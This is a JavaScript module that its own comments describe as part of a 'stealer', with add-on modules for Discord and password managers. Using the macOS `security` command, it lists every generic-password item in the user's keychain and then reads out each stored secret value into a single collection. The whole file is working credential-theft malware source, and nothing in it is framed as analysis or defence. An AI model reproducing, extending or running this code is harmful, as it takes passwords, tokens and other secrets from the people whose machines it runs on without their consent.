'use strict';
/*
 * macOS Keychain helpers (via the `security` CLI). Shared by the main stealer
 * and the per-feature modules (Discord, password managers, etc.). No native
 * deps — just the system `security` binary.
 */

const { execFileSync } = require('child_process');

// Fetch a generic-password item's value by service (+ optional account).
// Returns null when the item is absent or the read is denied. A per-call
// timeout guards against items that block waiting for keychain authentication
// (e.g. protected "BluetoothGlobal" entries), which would otherwise hang the
// whole stealer.
function keychainGet(service, account) {
  try {
    const cmd = ['find-generic-password', '-w', '-s', service];
    if (account) cmd.push('-a', account);
    return execFileSync('security', cmd, {
      encoding: 'utf8',
      timeout: 2000,
      stdio: ['ignore', 'pipe', 'pipe'],
    }).trim();
  } catch (e) {
    return null;
  }
}

// Parse `security dump-keychain` into a list of {service, account} generic
// password items. Values are fetched separately (the dump does not print them).
// The dump is expensive (one `security` process), so the result is cached for
// the process — the main stealer, other-apps scan, and password-manager module
// all share the same item list.
let itemsCache = null;
function keychainItems() {
  if (itemsCache) return itemsCache;
  let out;
  try {
    out = execFileSync('security', ['dump-keychain'], {
      encoding: 'utf8',
      maxBuffer: 1024 * 1024 * 512,
      timeout: 60000,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch (e) {
    itemsCache = [];
    return itemsCache;
  }
  const items = [];
  const seen = new Set();
  for (const block of out.split('class: "genp"').slice(1)) {
    const sv = block.match(/"svce"<blob>="((?:[^"\\]|\\.)*)"/);
    const ac = block.match(/"acct"<blob>="((?:[^"\\]|\\.)*)"/);
    const service = sv ? sv[1] : null;
    const account = ac ? ac[1] : null;
    const key = service + '\u0000' + (account || '');
    if (seen.has(key)) continue;
    seen.add(key);
    items.push({ service, account });
  }
  itemsCache = items;
  return items;
}

// Dump every generic-password item's value into a list.
function dumpKeychain() {
  const out = { total: 0, entries: [] };
  for (const item of keychainItems()) {
    if (!item.service) continue;
    const value = keychainGet(item.service, item.account);
    out.total++;
    out.entries.push({
      service: item.service,
      account: item.account,
      value: value === null ? undefined : value,
      retrieved: value !== null,
    });
  }
  return out;
}

module.exports = { keychainGet, keychainItems, dumpKeychain };
